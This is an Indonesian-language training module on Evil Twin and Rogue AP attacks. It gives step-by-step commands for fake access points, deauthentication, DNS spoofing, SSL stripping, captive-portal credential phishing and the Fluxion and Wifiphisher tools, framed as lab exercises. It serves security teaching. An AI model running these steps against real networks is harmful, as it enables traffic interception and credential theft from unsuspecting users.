# Modul 18: Evil Twin & Rogue AP

## Hostapd Configuration

- **Definisi**: Hostapd (Host Access Point Daemon) adalah software daemon yang mengubah wireless adapter menjadi Access Point (AP), digunakan untuk membuat fake AP dalam serangan Evil Twin.
- **File Konfigurasi Utama**:
  - **interface**: Interface wireless yang digunakan (contoh: `wlan0`).
  - **driver**: Driver yang digunakan, umumnya `nl80211` untuk adapter modern.
  - **ssid**: Nama jaringan yang akan ditampilkan (harus sama dengan target untuk Evil Twin).
  - **channel**: Channel yang digunakan, sebaiknya sama dengan target AP.
  - **hw_mode**: Mode hardware (a untuk 5GHz, g untuk 2.4GHz).
  - **auth_algs**: Algoritma autentikasi (1 untuk Open, 2 untuk Shared Key, 3 untuk keduanya).
  - **wpa**: Enkripsi WPA (0 untuk Open, 1 untuk WPA, 2 untuk WPA2, 3 untuk keduanya).
  - **wpa_passphrase**: Password WPA/WPA2 (jika menggunakan enkripsi).
- **Langkah-langkah**:
  1. Buat file konfigurasi: `sudo nano hostapd.conf`.
  2. Isi dengan konfigurasi dasar, contoh untuk Open AP:
     ```
     interface=wlan0
     driver=nl80211
     ssid=FreeWiFi
     channel=6
     hw_mode=g
     ```
  3. Jalankan hostapd: `sudo hostapd hostapd.conf`.
- **Kelebihan**: Fleksibel untuk berbagai konfigurasi, mendukung enkripsi WPA/WPA2, open source.
- **Kekurangan**: Memerlukan konfigurasi manual, tidak user-friendly untuk pemula.
- **Contoh Penggunaan**: Membuat AP palsu dengan SSID "Starbucks WiFi" di lab untuk pengujian awareness keamanan.

## Creating Fake Access Point

- **Definisi**: Proses membuat Access Point palsu yang meniru SSID target (Evil Twin) atau AP baru (Rogue AP) untuk menarik korban terhubung.
- **Perbedaan**:
  - **Evil Twin**: AP palsu dengan SSID identik dengan AP legitimate, bertujuan menipu pengguna AP asli.
  - **Rogue AP**: AP palsu dengan SSID menarik (contoh: "Free WiFi", "Guest Network") untuk menarik pengguna umum.
- **Langkah-langkah**:
  1. Identifikasi target AP: `sudo airodump-ng wlan0mon` (catat SSID, BSSID, Channel).
  2. Hentikan proses yang mengganggu: `sudo airmon-ng check kill`.
  3. Konfigurasi hostapd dengan SSID target.
  4. Setup DHCP server untuk memberikan IP ke klien: `sudo dnsmasq -C dnsmasq.conf -d`.
  5. Deauthenticate klien dari AP asli (opsional): `sudo aireplay-ng -0 0 -a [TARGET_BSSID] wlan0mon`.
  6. Jalankan hostapd: `sudo hostapd hostapd.conf`.
- **Kelebihan**: Efektif untuk Man-in-the-Middle attack, dapat menangkap kredensial dan traffic.
- **Kekurangan**: Memerlukan adapter dengan transmission power tinggi, detectable oleh WIDS/WIPS.
- **Contoh Penggunaan**: Membuat Evil Twin dari AP kantor "CorpNet" di lab untuk simulasi serangan internal.

## DNS Spoofing

- **Definisi**: Teknik manipulasi DNS response untuk mengarahkan korban ke server palsu, umumnya digunakan bersama Evil Twin untuk redirect traffic.
- **Tools**: DNSMasq, Ettercap, dnsspoof.
- **Langkah-langkah dengan DNSMasq**:
  1. Buat file konfigurasi DNSMasq: `sudo nano dnsmasq.conf`.
  2. Tambahkan konfigurasi:
     ```
     interface=wlan0
     dhcp-range=192.168.1.10,192.168.1.100,12h
     address=/google.com/192.168.1.1
     address=/#/192.168.1.1
     ```
     - `address=/#/[IP]`: Redirect semua domain ke IP attacker.
  3. Jalankan DNSMasq: `sudo dnsmasq -C dnsmasq.conf -d`.
  4. Setup web server palsu di IP attacker: `sudo python3 -m http.server 80`.
- **Kelebihan**: Transparan untuk korban, dapat redirect semua traffic HTTP ke halaman phishing.
- **Kekurangan**: Tidak efektif untuk HTTPS tanpa SSL stripping, mudah terdeteksi oleh DNSSEC.
- **Contoh Penggunaan**: Redirect semua request DNS korban ke halaman login palsu Facebook di lab.

## Credential Harvesting

- **Definisi**: Proses menangkap kredensial (username, password) dari korban yang terhubung ke Evil Twin melalui phishing page atau traffic sniffing.
- **Metode**:
  - **Captive Portal**: Halaman login palsu yang muncul saat korban terhubung ke AP.
  - **Traffic Sniffing**: Menangkap kredensial dari traffic HTTP/FTP dengan Wireshark atau tcpdump.
  - **SSL Stripping**: Downgrade HTTPS ke HTTP untuk menangkap kredensial plaintext.
- **Langkah-langkah (Traffic Sniffing)**:
  1. Setup Evil Twin dengan hostapd dan dnsmasq.
  2. Enable IP forwarding: `sudo sysctl -w net.ipv4.ip_forward=1`.
  3. Setup iptables untuk routing: `sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`.
  4. Capture traffic dengan Wireshark: `sudo wireshark -i wlan0` (filter: `http.request.method == "POST"`).
  5. Analisis paket untuk kredensial (username, password di HTTP POST).
- **Kelebihan**: Dapat menangkap kredensial real-time, efektif untuk HTTP dan protokol plaintext.
- **Kekurangan**: Tidak efektif untuk HTTPS/TLS tanpa SSL stripping, memerlukan analisis manual.
- **Contoh Penggunaan**: Menangkap kredensial login HTTP dari korban yang terhubung ke Evil Twin di lab.

## SSL Stripping

- **Definisi**: Teknik Man-in-the-Middle yang downgrade koneksi HTTPS korban ke HTTP, memungkinkan attacker menangkap traffic plaintext tanpa SSL/TLS.
- **Tools**: sslstrip, mitmproxy, bettercap.
- **Cara Kerja**:
  1. Attacker menjadi proxy antara korban dan server legitimate.
  2. Korban mengirim request HTTP ke attacker (bukan HTTPS).
  3. Attacker forward request ke server sebagai HTTPS.
  4. Attacker menangkap traffic plaintext dari korban sebelum di-encrypt.
- **Langkah-langkah dengan sslstrip**:
  1. Setup Evil Twin dengan hostapd dan dnsmasq.
  2. Enable IP forwarding: `sudo sysctl -w net.ipv4.ip_forward=1`.
  3. Redirect traffic HTTP ke port sslstrip: `sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080`.
  4. Jalankan sslstrip: `sudo sslstrip -l 8080 -w sslstrip.log`.
  5. Analisis log untuk kredensial: `cat sslstrip.log`.
- **Kelebihan**: Efektif untuk menangkap kredensial HTTPS tanpa certificate warning, transparan untuk korban.
- **Kekurangan**: Tidak efektif untuk HSTS-enabled sites, modern browser memiliki proteksi HTTPS-only.
- **Contoh Penggunaan**: Downgrade koneksi HTTPS korban ke HTTP untuk menangkap login credentials di lab.

## Captive Portal Phishing

- **Definisi**: Teknik menampilkan halaman login palsu (captive portal) saat korban terhubung ke Evil Twin, meniru portal legitimate untuk mencuri kredensial.
- **Skenario**: Meniru captive portal hotel, bandara, kafe (contoh: "Masukkan password WiFi untuk melanjutkan").
- **Langkah-langkah**:
  1. Setup Evil Twin dengan hostapd dan dnsmasq.
  2. Clone halaman login target: `wget -r -l 1 -k -p https://target.com/login`.
  3. Modifikasi HTML untuk mengirim kredensial ke attacker: tambahkan form action ke `http://192.168.1.1/capture.php`.
  4. Setup web server dengan halaman phishing: `sudo python3 -m http.server 80`.
  5. Setup iptables untuk redirect semua HTTP ke captive portal:
     ```
     sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
     sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
     ```
  6. Buat script PHP untuk menyimpan kredensial: `capture.php` (simpan POST data ke file).
- **Kelebihan**: Sangat meyakinkan untuk korban, dapat customized untuk target spesifik, high success rate.
- **Kekurangan**: Memerlukan web development skill, mudah terdeteksi jika design tidak sempurna.
- **Contoh Penggunaan**: Membuat captive portal palsu "Hotel WiFi Login" untuk menangkap email dan password di lab.

## Fluxion dan Wifiphisher

- **Definisi**: Tools automated untuk Evil Twin attack yang mengintegrasikan semua tahapan (fake AP, deauth, captive portal) dalam satu framework.
- **Fluxion**:
  - **Cara Kerja**: Scan AP target → Capture handshake → Clone AP → Deauth klien → Captive portal phishing untuk "verifikasi password WPA".
  - **Langkah-langkah**:
    1. Clone repository: `git clone https://github.com/FluxionNetwork/fluxion.git`.
    2. Install dependencies: `cd fluxion && sudo ./fluxion.sh --install`.
    3. Jalankan Fluxion: `sudo ./fluxion.sh`.
    4. Pilih interface, scan AP target, pilih metode handshake capture.
    5. Pilih template captive portal (generic, router-specific).
    6. Tunggu korban memasukkan password di captive portal, Fluxion verifikasi dengan handshake.
  - **Kelebihan**: Fully automated, verifikasi password real-time dengan handshake, multiple language support.
  - **Kekurangan**: Memerlukan handshake capture terlebih dahulu, dependency banyak, resource-intensive.
- **Wifiphisher**:
  - **Cara Kerja**: Automated Evil Twin dengan phishing templates (firmware upgrade, OAuth login, browser plugin update).
  - **Langkah-langkah**:
    1. Install: `sudo apt install wifiphisher` atau `git clone https://github.com/wifiphisher/wifiphisher.git`.
    2. Jalankan: `sudo wifiphisher -i wlan0 -e "Target_SSID" -p firmware-upgrade`.
       - `-e`: Target SSID, `-p`: Phishing scenario template.
    3. Wifiphisher otomatis setup AP, deauth, dan captive portal.
    4. Monitor kredensial di terminal atau log file.
  - **Kelebihan**: Mudah digunakan, banyak phishing templates, automatic deauth dan AP setup.
  - **Kekurangan**: Kurang customizable dibanding manual setup, tidak verifikasi password dengan handshake.
- **Contoh Penggunaan**: 
  - Fluxion: Menyerang AP "OfficeWiFi" dengan captive portal "Router Configuration Update" di lab.
  - Wifiphisher: Menjalankan Evil Twin dengan template "OAuth Login" untuk AP "CoffeeShop" di lab.
